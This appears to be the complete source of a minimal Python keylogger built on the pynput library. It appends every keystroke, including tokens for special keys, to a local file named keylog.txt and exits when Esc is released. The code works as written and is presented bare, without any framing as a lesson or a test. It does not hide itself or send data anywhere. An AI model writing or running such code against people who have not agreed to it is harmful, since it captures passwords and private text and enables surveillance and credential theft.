from pynput.keyboard import Key, Listener

def on_press(key):
    """Callback function that executes when a key is pressed."""
    try:
        # Log the character normally if it's a standard key
        with open("keylog.txt", "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys
        with open("keylog.txt", "a") as f:
            if key == Key.backspace:
                f.write("'del'")  # Backspace symbol
            elif key == Key.esc:
                f.write("'esc'")  # Escape symbol
            elif key == Key.space:
                f.write(" ")  # Space
            elif key == Key.shift:
                f.write("")  # Shift
            else:
                f.write(f"[{key}]")  # Log other special keys as-is

def on_release(key):
    """Callback function that executes when a key is released."""
    if key == Key.esc:
        # Stop listener if Esc key is pressed
        return False

# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
